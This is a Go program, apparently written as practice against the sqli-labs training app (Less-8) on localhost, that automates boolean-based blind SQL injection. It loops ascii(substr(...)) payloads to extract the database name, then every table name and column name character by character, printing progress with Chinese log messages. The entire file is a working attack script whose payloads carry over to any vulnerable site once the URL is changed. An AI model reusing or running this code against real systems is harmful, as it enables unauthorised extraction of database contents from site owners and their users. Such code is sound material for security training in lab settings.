package main

import (
	"fmt"
	"github.com/c0rdXy/GoSM/myUtils"
	"github.com/c0rdXy/GoSM/myUtils/myhttp"
	"log"
	"time"
)

var baseURL1 = "http://127.0.0.1/sql-lab/Less-8/?id="

func measureTime(start time.Time, name string) {
	elapsed := time.Since(start)
	log.Printf("执行 %s 所用时间: %s", name, elapsed)
}

func probeDatabaseLinear() string {
	defer measureTime(time.Now(), "线性搜索")

	sqlPayload := "database()"
	dbName := ""

	j := 1
	exitFlag := false
	for !exitFlag {
		exitFlag = true
		for i := 36; i < 127; i++ {
			payload := fmt.Sprintf("1' and ascii(substr(%s,%d,%d))=%d -- ", sqlPayload, j, j, i)
			_, check, err := myhttp.GetRequest(baseURL1, payload, myUtils.B)
			if err != nil {
				log.Fatalln("无法发起请求: ", err)
			}

			if check {
				dbName += string(i)
				fmt.Println("数据库名: ", dbName)
				exitFlag = false
				break
			}
		}
		j += 1
	}

	return dbName
}

func probeTablesLinear(databaseName string) []string {
	defer measureTime(time.Now(), "表搜索")

	tables := make([]string, 0)

	j := 0
	for {
		exitFlag := true
		for i := 36; i < 127; i++ {
			payload := fmt.Sprintf("1' and ascii(substr((select table_name from information_schema.tables where table_schema='%s' limit 1 offset %d),1,1))=%d -- ", databaseName, j, i)
			_, check, err := myhttp.GetRequest(baseURL1, payload, myUtils.B)
			if err != nil {
				log.Fatalln("无法发起请求: ", err)
			}

			if check {
				tableName := ""
				for k := 1; ; k++ {
					exitFlag2 := true
					for l := 36; l < 127; l++ {
						payload := fmt.Sprintf("1' and ascii(substr((select table_name from information_schema.tables where table_schema='%s' limit 1 offset %d),%d,1))=%d -- ", databaseName, j, k, l)
						_, check, err := myhttp.GetRequest(baseURL1, payload, myUtils.B)
						if err != nil {
							log.Fatalln("无法发起请求: ", err)
						}

						if check {
							tableName += string(l)
							exitFlag2 = false
							break
						}
					}

					if exitFlag2 {
						break
					}
				}

				tables = append(tables, tableName)
				fmt.Println("表名: ", tableName)
				exitFlag = false
				break
			}
		}

		if exitFlag {
			break
		}

		j++
	}

	return tables
}

func probeColumnsLinear(databaseName, tableName string) []string {
	defer measureTime(time.Now(), "字段搜索")

	columns := make([]string, 0)

	j := 1
	for {
		exitFlag := true
		for i := 36; i < 127; i++ {
			payload := fmt.Sprintf("1' and ascii(substr((select column_name from information_schema.columns where table_schema='%s' and table_name='%s' limit 1 offset %d),1,1))=%d -- ", databaseName, tableName, j, i)
			_, check, err := myhttp.GetRequest(baseURL1, payload, myUtils.B)
			if err != nil {
				log.Fatalln("无法发起请求: ", err)
			}

			if check {
				columnName := ""
				for k := 1; ; k++ {
					exitFlag2 := true
					for l := 36; l < 127; l++ {
						payload := fmt.Sprintf("1' and ascii(substr((select column_name from information_schema.columns where table_schema='%s' and table_name='%s' limit 1 offset %d),%d,1))=%d -- ", databaseName, tableName, j, k, l)
						_, check, err := myhttp.GetRequest(baseURL1, payload, myUtils.B)
						if err != nil {
							log.Fatalln("无法发起请求: ", err)
						}

						if check {
							columnName += string(l)
							exitFlag2 = false
							break
						}
					}

					if exitFlag2 {
						break
					}
				}

				columns = append(columns, columnName)
				fmt.Println("字段名: ", columnName)
				exitFlag = false
				break
			}
		}

		if exitFlag {
			break
		}

		j++
	}

	return columns
}

func main() {
	databaseName := probeDatabaseLinear()

	tables := probeTablesLinear(databaseName)

	for _, table := range tables {
		columns := probeColumnsLinear(databaseName, table)
		fmt.Printf("数据库: %s, 表: %s, 字段: %v\n", databaseName, table, columns)
	}
}
